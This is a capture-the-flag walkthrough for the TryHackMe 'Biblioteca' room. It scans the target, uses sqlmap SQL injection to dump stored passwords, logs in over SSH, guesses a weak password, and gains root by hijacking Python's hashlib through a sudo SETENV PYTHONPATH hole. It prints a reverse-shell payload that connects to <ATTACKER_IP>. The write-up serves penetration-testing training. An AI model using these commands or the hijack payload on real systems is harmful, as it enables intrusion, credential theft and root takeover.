# [Biblioteca](https://tryhackme.com/room/biblioteca)

## Shhh. Be very very quiet, no shouting inside the biblioteca.

# What is the user and root flag?

## Hit 'em with the classics.

### What is the user flag?

_Weak password_

1. Start by scanning the target to discover open ports and running services.

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Navigate to `http://<TARGET_IP>:8000` in a browser. Register a new account, then attempt to log in and intercept the request with Burp Suite. Save the raw request to a file named `login` for use with SQLMap.

```
POST /login HTTP/1.1
Host: <TARGET_IP>:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=test&password=test
```

3. Feed the captured request to SQLMap to test the login form for SQL injection vulnerabilities. The `-r` flag reads the request from a file, `--dbs` enumerates available databases, and `--dump` extracts table contents.

```bash
sqlmap -r login --dbs --dump
```

**Results:**

```
+----+-------------------+----------------+----------+
| id | email             | password       | username |
+----+-------------------+----------------+----------+
| 1  | smokey@email.boop | My_P@ssW0rd123 | smokey   |
| 2  | test@thm.com      | test           | test     |
+----+-------------------+----------------+----------+
```

4. Log in via SSH using the credentials recovered from the database.

```bash
ssh smokey@<TARGET_IP>
```

5. Search the filesystem for the flag.

```bash
find / -name "user*.txt" -type f 2>/dev/null
```

**Results:**

```
/var/lib/cloud/instances/i-057b33f46d0ff6c2e/user-data.txt
/home/hazel/user.txt
/usr/share/doc/cloud-init/userdata.txt
/usr/share/doc/cloud-init/examples/user-script.txt
```

> The user flag is at `/home/hazel/user.txt`, but we are logged in as `smokey` and lack read access to hazel's home directory.

6. Try switching to the `hazel` user. The room hints at weak passwords - the username itself works as the password.

```bash
su hazel
# Password: hazel
```

7. Read the user flag.

```bash
cat /home/hazel/user.txt
```

[SCREEN01]

---

### What is the root flag?

1. Check what commands `hazel` is permitted to run with elevated privileges.

```bash
sudo -l
```

**Results:**

```
User hazel may run the following commands on ip-10-114-134-253:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
```

> Hazel can run `hasher.py` as root without a password. The `SETENV` flag is the key: it allows environment variables (such as `PYTHONPATH`) to be set when invoking the sudo command, opening the door to a Python library hijacking attack.

2. Inspect the script to understand which modules it imports.

```bash
cat hasher.py
```

```python
import hashlib

def hashing(passw):

    md5 = hashlib.md5(passw.encode())

    print("Your MD5 hash is: ", end ="")
    print(md5.hexdigest())

    sha256 = hashlib.sha256(passw.encode())

    print("Your SHA256 hash is: ", end ="")
    print(sha256.hexdigest())

    sha1 = hashlib.sha1(passw.encode())

    print("Your SHA1 hash is: ", end ="")
    print(sha1.hexdigest())


def main():
    passw = input("Enter a password to hash: ")
    hashing(passw)

if __name__ == "__main__":
    main()
```

> The script imports the standard `hashlib` module. Because `SETENV` lets us control `PYTHONPATH`, we can force Python to load a malicious `hashlib.py` from a directory we control before it reaches the real standard library.

3. Copy the legitimate `hashlib.py` to `tmp` so our file remains functional and doesn't cause obvious import errors.

```bash
cp /usr/lib/python3.8/hashlib.py /tmp/hashlib.py
```

4. Prepend the following reverse shell payload to the `/tmp/hashlib.py` file. When `hasher.py` imports `hashlib`, Python will execute this code immediately as root.

```python
import sys,socket,os,pty

RHOST = "<ATTACKER_IP>"
RPORT = 4444
s = socket.socket()
s.connect((RHOST, RPORT))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn("/bin/sh")
```

[SCREEN03]

5. On the attack machine, start a Netcat listener to catch the incoming root shell.

```bash
nc -lvnp 4444
```

6. Trigger the exploit by running `hasher.py` as root while setting `PYTHONPATH` to `tmp`. Python searches `PYTHONPATH` entries before the default library directories, so it loads our malicious `/tmp/hashlib.py` instead of the real one, executing the reverse shell as root.

```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
```

7. In the resulting root shell on the listener, read the root flag.

```bash
cat /root/root.txt
```

[SCREEN02]
